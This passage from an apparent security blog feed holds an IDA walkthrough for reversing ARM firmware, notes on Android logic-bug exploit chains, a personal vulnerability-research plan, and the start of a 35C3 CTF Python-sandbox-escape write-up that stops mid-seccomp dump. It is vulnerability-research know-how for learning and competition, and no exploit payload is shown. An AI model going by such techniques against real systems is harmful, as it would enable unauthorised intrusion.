see:</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190129120005.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190129120005.png"></a></p><p>we choice yes, than..</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190129122829.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190129122829.png"></a></p><p>How to fill this table?  Keep the default and press ok.</p><h2 id="0x03-fix-the-binary"><a href="#0x03-fix-the-binary" class="headerlink" title="0x03 fix the binary"></a>0x03 fix the binary</h2><p>when the ida auto analysis has been finished.we saw like this.</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190129123558.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190129123558.png"></a></p><p>what fuck this????</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190129124202.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190129124202.png"></a></p><p>Only rom segmentation,we should create other segmentation and find the code seg. so we should to find some information and analysis this bin .</p><p>we use hot-key “D”,to fix some data.</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190129125802.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190129125802.png"></a></p><p>Generally peaking , </p><p><code>:00000000                 DCD 0x20007AD8</code> after is  interupt vector</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190129125846.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190129125846.png"></a></p><p>In the red box is function pointer. and first function pointer is odd number ,so we can think this bin is 16-bit. So we change it use <code>alt g</code> and choice T register value 0 to 1</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190129130204.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190129130204.png"></a></p><blockquote><h2 id="控制位-含义"><a href="#控制位-含义" class="headerlink" title="控制位                        含义"></a>控制位                        含义</h2><p>I                             I=1 禁用IRO中断<br>F                             F=1 禁用FIQ中断<br>T                             ARMv4以上T版本T=0 执行ARM指令,T=1执行Thumb指令。<br>                              ARMv5以上非T版本T=0 执行ARM指令,T=1表示下一条指令产生未定义指令中断。M[4:0]                  </p></blockquote><blockquote><p>thumb指令集是arm指令集的一个子集，是针对代码密度问题而提出的，它具有16位的代码宽度。与等价的32位代码相比较，thumb指令集在保留32位代码优势的同时，大大的节省了系统的存储空间。thumb不是一个完整的体系结构，不能指望处理器只执行thumb指令集而不支持arm指令集。</p></blockquote><p>than we should guest the binary base address</p><p>we know ,usually the base low 3 bit is zero..and the interupt vector addr after of the base…so we guest the base addr is 0x1b000 ..so we try change base addr.</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190129144317.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190129144317.png"></a></p><p>set the value equal 0x1b000</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190129144340.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190129144340.png"></a></p><p>now ,these interrupt is functuon pointer:</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190129150705.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190129150705.png"></a></p><p>Next step ,we should restore code </p><p>use P and C hot-key..</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190129145126.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190129145126.png"></a></p><p>like this 0x10 data ,it maybe is <code>push</code> opcode so we press P to analysis…</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/1.gif" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/1.gif"></a></p><p>if we finish ,than we shoulde create some seg</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190129145832.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190129145832.png"></a></p><p>like this url <a href="https://www.youtube.com/watch?v=V6ZySLopflk">Setup and Find Entry-point in ARM Firmware - Hardware Wallet Research #4</a></p><p>先写到这。。还原 seg 我写脚本 恢复代码去了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_addr_shoulde_P</span>(<span class="params">i</span>):</span></span><br><span class="line">    <span class="keyword">if</span> Byte(i) == <span class="number">0x10</span>:</span><br><span class="line">        MakeFunction(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_addr_P</span>(<span class="params">va_start,va_end</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(va_start,va_end):</span><br><span class="line">        is_addr_shoulde_P(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    do_addr_P(<span class="number">0x01B5B4</span>,<span class="number">0x02B5B4</span>)</span><br></pre></td></tr></table></figure><p>run this script we got </p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190129154752.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190129154752.png"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> reverse </tag>
            
            <tag> arm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Building Exploit Chains with Logic Bugs</title>
      <link href="Building_xploit_Chains%20with_Logic_Bugs.html"/>
      <url>Building_xploit_Chains%20with_Logic_Bugs.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="Building-Exploit-Chains-with-Logic-Bugs"><a href="#Building-Exploit-Chains-with-Logic-Bugs" class="headerlink" title="Building Exploit Chains with Logic Bugs"></a>Building Exploit Chains with Logic Bugs</h2><h3 id="Traditional-Approach"><a href="#Traditional-Approach" class="headerlink" title="Traditional Approach"></a>Traditional Approach</h3><p>•Search for commonly misused methods</p><p>•Class loading</p><p>•Unzip path traversals</p><p>•External storage operations</p><p>•SSL error handling</p><p>•Decompile APK</p><p>•Is it used? Is it accessible? Is it vulnerable?</p><p>•Repeat for each application on the device</p><h3 id="Process-Automation"><a href="#Process-Automation" class="headerlink" title="Process Automation"></a>Process Automation</h3><p>Which parts of the process can we automate? </p><p>• Is it used?<br>• Is it accessible? • Is it vulnerable? </p><p>• Wouldn’t Joern solve this? • Code property graphs </p><p>• C/C++ only </p><p>• We need Joern for Android • Jandroid </p><h3 id="Automation-Overview"><a href="#Automation-Overview" class="headerlink" title="Automation Overview"></a>Automation Overview</h3><p>1.Find use of search term in the application</p><p>2.Find calls to this method</p><p>3.Find calls to these methods</p><p>4.Find any instances of methods exported in Manifest</p><p>在<a href="https://zh.wikipedia.org/wiki/Java%E5%B9%B3%E8%87%BA">Java平台</a>中, <strong>清单文件</strong>（Manifest file）是<a href="https://zh.wikipedia.org/wiki/JAR_(%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F)">JAR档案</a>[<a href="https://zh.wikipedia.org/wiki/%E6%B8%85%E5%8D%95%E6%96%87%E4%BB%B6#cite_note-1">1]</a>[<a href="https://zh.wikipedia.org/wiki/%E6%B8%85%E5%8D%95%E6%96%87%E4%BB%B6#cite_note-2">2]</a>中包含的特殊文件。<strong>Manifest</strong>文件被用来定义扩展或档案打包相关数据，是一个<a href="https://zh.wikipedia.org/wiki/%E5%85%83%E6%95%B0%E6%8D%AE">元数据</a>文件，它包含了不同部分中的<a href="https://zh.wikipedia.org/w/index.php?title=%E5%90%8D/%E5%80%BC%E5%AF%B9&action=edit&redlink=1">名/值对</a>数据。如果一个JAR文件被用来作为可执行文件，那么其中的Manifest文件需要指出该程序的主类文件。通常Manifest文件的文件名为<code>MANIFEST.MF</code>。</p><p>通常Manifest文件都与Java档案相关，其他的情况比较少见。</p><h3 id="Static-Analysis-at-Scale"><a href="#Static-Analysis-at-Scale" class="headerlink" title="Static Analysis at Scale"></a>Static Analysis at Scale</h3><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190110013902.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190110013902.png"></a></p><p>还在阅读中：</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> logic bugs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>The past year, the new year</title>
      <link href="The-past-year-the-new-year.html"/>
      <url>The-past-year-the-new-year.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="过去的2018-年"><a href="#过去的2018-年" class="headerlink" title="过去的2018 年"></a>过去的2018 年</h2><p> <a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190114005424.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190114005424.png"></a></p><h2 id="2019年"><a href="#2019年" class="headerlink" title="2019年"></a>2019年</h2><p>一点小计划吧：</p><h3 id="1、代码审计训练"><a href="#1、代码审计训练" class="headerlink" title="1、代码审计训练"></a>1、代码审计训练</h3><p>最近公司接了个项目，遇到了一次庞大的代码，在这种庞大的代码面前有点无从下手的感觉。简单打算，新的一年，读更多的代码，审更多的洞。</p><p>（以下摘自 riusksk 泉哥 安全研究者的自我修养）</p><p>（1）根据自己目标定位，寻找相应的历史漏洞案例进行学习，比如要搞chrome就找chrome的历史漏洞</p><p>（2）掌握漏洞所在的模块或子系统，但不看完整的漏洞细节描述，尝试在漏洞版本中找出对应的漏洞</p><p>（3）如果（2）中未能找出漏洞，就去看漏洞细节描述，对比自己的审计过程，看遗漏了哪一步骤</p><p>（4）不断重复上述训练，直至相信：挖洞只是体力消耗，而非能力问题</p><p>这第4点说得，非常励志，因为挖洞挖久了，有时真的容易怀疑自己的能力，目标难度越大，越容易打击人。</p><p>作者第一次训练的漏洞是j00ru（Project Zero成员）的IDA漏洞：<a href="https://j00ru.vexillium.org/2014/10/secure-2014-slide-deck-and-hex-rays-ida-pro-advisories-published/%EF%BC%8C2014%E5%B9%B4%E7%9A%84%E6%96%87%E7%AB%A0%E4%BA%86">https://j00ru.vexillium.org/2014/10/secure-2014-slide-deck-and-hex-rays-ida-pro-advisories-published/，2014年的文章了</a></p><h3 id="2、训练挖洞的双技能"><a href="#2、训练挖洞的双技能" class="headerlink" title="2、训练挖洞的双技能"></a>2、训练挖洞的双技能</h3><p>（1）看洞：哪里看？历史漏洞的git log、bug报告、代码质量报告等等</p><p>（2）识洞：就是肉眼看代码找漏洞，即代码审计，难点也就是在这上面，训练方法继续往下看</p><p>其实，我更认为我应该训练找洞和利用漏洞的能力，所以我更想归纳为</p><p>（1）识洞： 从git log 、diff log 找到漏洞点、漏洞利用点，从源代码、反汇编、调试的过程找到漏洞</p><p>（2）利用：写更多的exploit ，写更多有意思 、高质量的exploit，可以从 cve、0day 练习起来。</p><p>新年不仅想完成工作上的内容，业余我还想跟踪最新的、有意思的漏洞 （另外想入坑webkit了）</p><h3 id="3、Fuzzing训练"><a href="#3、Fuzzing训练" class="headerlink" title="3、Fuzzing训练"></a>3、Fuzzing训练</h3><p>（1）拿已公开的历史漏洞问自己：如何写fuzzer挖掘到此漏洞？</p><p>（2）如果自己不知道此漏洞，那又能够挖掘到呢？</p><p>（3）不断重复训练并改进fuzzer，相信会有更多漏洞被意外发现</p><h3 id="4、能力（基础）往往比运气和天赋更重要"><a href="#4、能力（基础）往往比运气和天赋更重要" class="headerlink" title="4、能力（基础）往往比运气和天赋更重要"></a>4、能力（基础）往往比运气和天赋更重要</h3><p>泉哥在他blog这么写的：</p><p>努力往往比运气和天赋更重要</p><p>虽然挖洞也需要一定运气和天赋，但多数你认为的挖洞天才，其实只不过是花了比你多100倍，甚至更多的时间在这项技术研究上而已</p><p>我认为呢：</p><p>有段时间总听到朋友说挖到的洞都是运气好，然而我想的是，如果没有足够的基础、没有足够的意识、即使有个0day砸到你头上，我也未必能意识到。所以努力吧、学习吧！</p><h3 id="5、收集和学习开源的漏洞挖掘工具"><a href="#5、收集和学习开源的漏洞挖掘工具" class="headerlink" title="5、收集和学习开源的漏洞挖掘工具"></a>5、收集和学习开源的漏洞挖掘工具</h3><p>比如afl、honggfuzz、libfuzzer等很多优秀的漏洞挖掘工具，都是值得好好阅读代码，学习其中的fuzzing思路，可以更好地应用到未来的漏洞挖掘研究上</p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>希望18年没拿到的cve ，在19年能拿到。希望 18年没有挖到洞，在19年能有更好的产出。希望18年那么菜的自己，19年自己能变得更强吧。我也想成为 master of pwn阿！</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> life </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>35C3 CTF 2018 - collection (pwn)</title>
      <link href="2018-353cCTF-2018-collection-pwn.html"/>
      <url>2018-353cCTF-2018-collection-pwn.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p><a href="https://35c3ctf.ccc.ac/uploads/52ae03f0ae030a74a2bd466852308cba74c0f313.tar.gz">behold my collection</a></p><p>The container is built with the following important statements</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FROM ubuntu:18.04</span><br><span class="line">RUN apt-get -y install python3.6</span><br><span class="line">COPY build&#x2F;lib.linux-x86_64-3.6&#x2F;Collection.cpython-36m-x86_64-linux-gnu.so &#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.6&#x2F;dist-packages&#x2F;Collection.cpython-36m-x86_64-linux-gnu.so</span><br></pre></td></tr></table></figure><p>Copy the library in the same destination path and check that it works with</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3.6 test.py</span><br></pre></td></tr></table></figure><p>Challenge runs at 35.207.157.79:4444</p><p>Difficulty: easy</p><h2 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h2><p>题目给了python3.6 和 Collection.cpython-36m-x86_64-linux-gnu.so 这两个比较有用的文件。其中从命名我们可以得知 Collection.cpython-36m-x86_64-linux-gnu.so 是C语言写的一个Python库。</p><p>在 Server.py 文件里，我们可以得知这是一个 Python escape题。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">randstr</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = open(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">from sys import modules</span></span><br><span class="line"><span class="string">del modules[&#x27;os&#x27;]</span></span><br><span class="line"><span class="string">import Collection</span></span><br><span class="line"><span class="string">keys = list(__builtins__.__dict__.keys())</span></span><br><span class="line"><span class="string">for k in keys:</span></span><br><span class="line"><span class="string">    if k != &#x27;id&#x27; and k != &#x27;hex&#x27; and k != &#x27;print&#x27; and k != &#x27;range&#x27;:</span></span><br><span class="line"><span class="string">        del __builtins__.__dict__[k]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">size_max = <span class="number">20000</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;enter your code, enter the string END_OF_PWN on a single line to finish&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">code = prefix</span><br><span class="line">new = <span class="string">&quot;&quot;</span></span><br><span class="line">finished = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> size_max &gt; len(code):</span><br><span class="line">    new = raw_input(<span class="string">&quot;code&gt; &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> new == <span class="string">&quot;END_OF_PWN&quot;</span>:</span><br><span class="line">        finished = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    code += new + <span class="string">&quot;\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> finished:</span><br><span class="line">    print(<span class="string">&quot;max length exceeded&quot;</span>)</span><br><span class="line">    sys.exit(<span class="number">42</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&quot;/tmp/%s&quot;</span> % randstr()</span><br><span class="line"><span class="keyword">with</span> open(file_name, <span class="string">&quot;w+&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(code.encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">os.dup2(flag.fileno(), <span class="number">1023</span>)</span><br><span class="line">flag.close()</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&quot;python3.6 -u %s&quot;</span> % file_name</span><br><span class="line">os.system(cmd)</span><br></pre></td></tr></table></figure><p>从关键的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">prefix = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">from sys import modules</span></span><br><span class="line"><span class="string">del modules[&#x27;os&#x27;]</span></span><br><span class="line"><span class="string">import Collection</span></span><br><span class="line"><span class="string">keys = list(__builtins__.__dict__.keys())</span></span><br><span class="line"><span class="string">for k in keys:</span></span><br><span class="line"><span class="string">    if k != &#x27;id&#x27; and k != &#x27;hex&#x27; and k != &#x27;print&#x27; and k != &#x27;range&#x27;:</span></span><br><span class="line"><span class="string">        del __builtins__.__dict__[k]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>我们可以得知，这他删掉了 os 模块，只留下了 id ,hex ,print ,range。我们第一思路就是，突破口在 </p><p>Collection.cpython-36m-x86_64-linux-gnu.so 这个扩展库里。于是我们先去逆向这个文件</p><h2 id="对-Collection-逆向"><a href="#对-Collection-逆向" class="headerlink" title="对 Collection 逆向"></a>对 Collection 逆向</h2><p>我们可以清晰的看到这个文件保留了符号：</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190101151855.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190101151855.png"></a></p><p>由于是用来作为Python扩展库，方便用来直接 import 所以保留符号应该是其一个原因之一。由于以前没有用C写过Python的扩展库。所以了解了一下：</p><p><a href="https://docs.python.org/3/extending/building.html#building-c-and-c-extensions">Building C and C++ Extensions</a></p><p>从中我们大概可以得知的是 PyInit_Collection初始化<code>Collection</code>将要实现的此类型的自定义类型。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">int64 <span class="title">PyInit_Collection</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  __int64 v1; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">int</span>)PyType_Ready(&amp;qword_2041E0) &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  v0 = PyModule_Create2(&amp;unk_204120, <span class="number">1013L</span>L);</span><br><span class="line">  v1 = v0;</span><br><span class="line">  <span class="keyword">if</span> ( v0 )</span><br><span class="line">  &#123;</span><br><span class="line">    ++qword_2041E0;</span><br><span class="line">    PyModule_AddObject(v0, <span class="string">&quot;Collection&quot;</span>, &amp;qword_2041E0);</span><br><span class="line">    mprotect((<span class="keyword">void</span> *)<span class="number">0x439000</span>, <span class="number">1u</span>LL, <span class="number">7</span>);</span><br><span class="line">    MEMORY[<span class="number">0x43968F</span>] = _mm_load_si128((<span class="keyword">const</span> __m128i *)&amp;xmmword_27E0);</span><br><span class="line">    MEMORY[<span class="number">0x43969F</span>] = MEMORY[<span class="number">0x43968F</span>];</span><br><span class="line">    mprotect((<span class="keyword">void</span> *)<span class="number">0x439000</span>, <span class="number">1u</span>LL, <span class="number">5</span>);</span><br><span class="line">    init_sandbox();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个过程中，我们发现其在 seccomp 函数中做了一些 seccomp：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF  K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x01 0x00 0xc000003e  <span class="keyword">if</span> (A == ARCH_X86_64) goto 0003</span><br><span class="line"> 0002: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br><span class="line"> 0003: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0004: 0x15 0x00 0x01 0x0000003c  <span class="keyword">if</span> (A != <span class="built_in">exit</span>) goto 0006</span><br><span class="line"> 0005: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0006: 0x15 0x00 0x01 0x000000e7  <span class="keyword">if</span> (A != exit_group) goto 0008</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0008: 0x15 0x00 0x01 0x0000000c  <span class="keyword">if</span> (A != brk) goto 0010</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0010: 0x15 0x00 0x01 0x00000009  <span class="keyword">if</span> (A != mmap) goto 0012</span><br><span class="line"> 0011: 0x05 0x00 0x00 0x00000011  goto 0029</span><br><span class="line"> 0012: 0x15 0x00 0x01 0x0000000b  <span class="keyword">if</span> (A != munmap) goto 0014</span><br><span class="line"> 0013: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0014: 0x15 0x00 0x01 0x00000019  <span class="keyword">if</span> (A != mremap) goto 0016</span><br><span class="line"> 0015: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0016: 0x15 0x00 0x01 0x00000013  <span class="keyword">if</span> (A != readv) goto 0018</span><br><span class="line"> 0017: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0018: 0x15 0x00 0x01 0x000000ca  <span class="keyword">if</span> (A != futex) goto 0020</span><br><span class="line"> 0019: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0020: 0x15 0x00 0x01 0x00000083  <span class="keyword">if</span> (A != sigaltstack) goto 0022</span><br><span class="line"> 0021: 0x06 0x00 0x00 